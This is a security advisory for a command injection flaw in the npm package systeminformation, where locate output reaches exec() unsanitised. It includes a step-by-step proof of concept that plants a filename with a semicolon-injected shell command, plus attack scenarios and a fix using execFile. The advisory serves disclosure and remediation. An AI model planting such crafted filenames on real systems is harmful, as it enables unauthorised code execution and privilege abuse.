# [H] Command Injection via Unsanitized `locate` Output in `versions()` — systeminformation

## Summary
Severity: High
Advisory: GHSA-5vv4-hvf7-2h46
CVE: CVE-2026-26318
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-02-18
Source: https://github.com/advisories/GHSA-5vv4-hvf7-2h46
Type: github-advisory

## Affected
- npm: `systeminformation` — affected >=0 <5.31.0

## Details
# Command Injection via Unsanitized `locate` Output in `versions()` — systeminformation

**Package:** systeminformation (npm)  
**Tested Version:** 5.30.7  
**Affected Platform:** Linux  
**Author:** Sebastian Hildebrandt  
**Weekly Downloads:** ~5,000,000+  
**Repository:** https://github.com/sebhildebrandt/systeminformation  
**Severity:** Medium  
**CWE:** CWE-78 (OS Command Injection)  

---

### The Vulnerable Code Path

Inside the `versions()` function, when detecting the PostgreSQL version on Linux, the code does this:

```javascript
// lib/osinfo.js — lines 770-776

exec('locate bin/postgres', (error, stdout) => {
  if (!error) {
    const postgresqlBin = stdout.toString().split('\n').sort();
    if (postgresqlBin.length) {
      exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', (error, stdout) => {
        // parses version string...
      });
    }
  }
});
```

Here's what happens step by step:

1. It runs `locate bin/postgres` to search the filesystem for PostgreSQL binaries
2. It splits the output by newline and sorts the results alphabetically
3. It takes the **last element** (highest alphabetically)
4. It concatenates that path directly into a new `exec()` call with `+ ' -V'`

**No `sanitizeShellString()`. No path validation. No `execFile()`. Raw string concatenation into `exec()`.**

The `locate` command reads from a system-wide database (`plocate.db` or `mlocate.db`) that indexes all filenames on the system. If any indexed filename contains shell metacharacters — specifically semicolons — those characters will be interpreted by the shell when passed to `exec()`.

---

## Exploitation

### Prerequisites

For this vulnerability to be exploitable, the following conditions must be met:

1. **Target system runs Linux** — the vulnerable code path is inside an `if (_linux)` block
2. **`locate` / `plocate` is installed** — common on Ubuntu, Debian, Fedora, RHEL
3. **PostgreSQL binary exists in the locate database** — so `locate bin/postgres` returns results (otherwise the code falls through to a safe `psql -V` fallback)
4. **The attacker can create files on the filesystem** — in any directory that gets indexed by `updatedb`
5. **The locate database gets updated** — `updatedb` runs daily via systemd timer (`plocate-updatedb.timer`) or cron on most distros

### Step 1 — Verify the Environment

On the target machine, confirm locate is available and running:

```
which locate
# /usr/bin/locate

systemctl list-timers | grep plocate
# plocate-updatedb.timer    plocate-updatedb.service
# (runs daily, typically around 1-2 AM)
```

Check who owns the locate database:

```
ls -la /var/lib/plocate/plocate.db
# -rw-r----- 1 root plocate 18851616 Feb 14 01:50 /var/lib/plocate/plocate.db
```

Database is root-owned and updated by root. Regular users cannot update it directly, but `updatedb` runs on a daily schedule and indexes all readable files.

### Step 2 — Craft the Malicious File Path

The key insight is that **Linux allows semicolons in filenames**, and `exec()` passes strings through `/bin/sh -c` which **interprets semicolons as command separators**.

Create a file whose path contains an injected command:

```
mkdir -p "/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin"
touch "/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres"
```

Verify it exists:

```
find /var/tmp -name postgres
# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
```

This file needs to end up in the `locate` database. On a real system, this happens automatically when `updatedb` runs overnight. For testing purposes:

```
sudo updatedb
```

Then verify locate picks it up:

```
locate bin/postgres
# /usr/lib/postgresql/14/bin/postgres
# /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
```

### Step 3 — Understand the Sort Trick

The vulnerable code sorts the locate results alphabetically and takes the **last** element:

```javascript
const postgresqlBin = stdout.toString().split('\n').sort();
exec(postgresqlBin[postgresqlBin.length - 1] + ' -V', ...);
```

Alphabetically, `/var/` sorts **after** `/usr/`. So our malicious path naturally becomes the selected one:

```
Node.js sort order:
  [0] /usr/lib/postgresql/14/bin/postgres   ← legitimate
  [1] /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres   ← selected (last)
```

Quick verification:

```
node -e "
const paths = [
  '/usr/lib/postgresql/14/bin/postgres',
  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'
];
console.log('Sorted:', paths.sort());
console.log('Selected (last):', paths[paths.length - 1]);
"
```

Output:

```
Sorted: [
  '/usr/lib/postgresql/14/bin/postgres',
  '/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres'
]
Selected (last): /var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres
```

### Step 4 — Trigger the Vulnerability

Now when any application using systeminformation calls `versions()` requesting the postgresql version, the injected command fires:

```javascript
const si = require('systeminformation');

// This is a normal, innocent API call
si.versions('postgresql').then(data => {
  console.log(data);
});
```

Internally, the library builds and executes this command:

```
/var/tmp/x;touch /tmp/SI_RCE_PROOF;/bin/postgres -V
```

The shell (`/bin/sh -c`) interprets this as three separate commands:

```
/var/tmp/x                         →  fails silently (not executable)
touch /tmp/SI_RCE_PROOF            →  ATTACKER'S COMMAND EXECUTES
/bin/postgres -V                   →  runs normally, returns version
```

### Step 5 — Verify Code Execution

```
ls -la /tmp/SI_RCE_PROOF
# -rw-rw-r-- 1 appuser appuser 0 Feb 14 15:30 /tmp/SI_RCE_PROOF
```

The file exists. Arbitrary command execution confirmed.

The injected command runs with **whatever privileges the Node.js process has**. In a monitoring dashboard or backend API context, that's typically the application service account.

---

## Real-World Attack Scenarios

### Scenario 1 — Shared Hosting / Multi-Tenant Server

A low-privileged user on a shared server creates the malicious file in `/tmp` or their home directory. The hosting provider runs a monitoring agent that uses `systeminformation` for health dashboards. Next time the agent calls `versions()`, the attacker's command executes under the monitoring agent's (higher-privileged) service account.

### Scenario 2 — CI/CD Pipeline Poisoning

A malicious contributor submits a PR that includes a build step creating files with crafted names. If the CI pipeline uses `systeminformation` for environment reporting (common in test harnesses and build dashboards), the injected commands execute in the CI runner context — potentially leaking secrets, tokens, and deployment keys.

### Scenario 3 — Container / Kubernetes Escape

In containerized environments where `/var` or `/tmp` sits on a shared volume, a compromised container creates the malicious file. When the host-level monitoring agent (running `systeminformation`) calls `versions()`, the injected command executes on the host, breaking out of the container boundary.

---

## Suggested Fix

Replace `exec()` with `execFile()` for the PostgreSQL binary version check. `execFile()` does not spawn a shell, so metacharacters in the path are treated as literal characters:

```javascript
const { execFile } = require('child_process');

exec('locate bin/postgres', (error, stdout) => {
  if (!error) {
    const postgresqlBin = stdout.toString().split('\n')
      .filter(p => p.trim().length > 0)
      .sort();
    if (postgresqlBin.length) {
      execFile(postgresqlBin[postgresqlBin.length - 1], ['-V'], (error, stdout) => {
        // ... parse version
      });
    }
  }
});
```

Additionally, the locate output should be validated against a safe path pattern before use:

```javascript
const safePath = /^[a-zA-Z0-9/_.-]+$/;
const postgresqlBin = stdout.toString().split('\n')
  .filter(p => safePath.test(p.trim()))
  .sort();
```

---

## Disclosure

- **Reported via:** GitHub Private Security Advisory
- **Advisory URL:** https://github.com/sebhildebrandt/systeminformation/security/advisories/new
- **Security Contact:** security@systeminformation.io

## References
- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5vv4-hvf7-2h46
- https://nvd.nist.gov/vuln/detail/CVE-2026-26318
- https://github.com/sebhildebrandt/systeminformation/commit/b67d3715eec881038ccbaace2f2711419ac3e107
- https://github.com/sebhildebrandt/systeminformation
